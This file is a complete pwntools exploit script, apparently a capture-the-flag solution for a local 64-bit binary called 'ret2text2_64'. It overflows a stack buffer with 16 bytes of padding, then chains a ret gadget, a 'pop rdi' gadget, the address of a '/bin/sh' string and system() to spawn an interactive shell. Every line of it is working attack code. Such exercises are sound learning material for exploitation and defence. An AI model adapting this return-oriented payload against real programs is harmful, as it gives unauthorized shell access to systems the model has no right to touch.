from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p=process("./ret2text2_64")
elf = ELF("./ret2text2_64")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

#gdb.attach(p,'b *0x401211')
pop_rdi_ret=0x4012c3
ret=0x40101a
bin_sh=0x40200a
system = 0x40109b
offset = 16
# payload = 0x10*b'a' + p64(ret) + p64(pop_rdi_ret) + p64(next(elf.search(b"/bin/sh"))) + p64(elf.sym['system'])
payload = offset*b'a' + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(elf.sym['system'])
p.sendline(payload)
# pause()
p.interactive()
